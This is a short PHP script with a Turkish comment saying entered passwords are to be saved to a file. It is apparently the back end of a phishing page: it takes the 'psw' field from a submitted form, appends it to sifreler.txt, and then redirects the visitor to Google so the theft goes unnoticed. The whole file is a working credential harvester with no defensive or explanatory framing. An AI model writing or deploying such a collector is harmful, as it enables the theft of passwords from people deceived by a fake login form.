<?php
//Girilen şifreler bu alanda sifreler.txt dosyasına kaydedilecek
file_put_contents("sifreler.txt", " [Sifre:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
header('Location: https://www.google.com');
?>
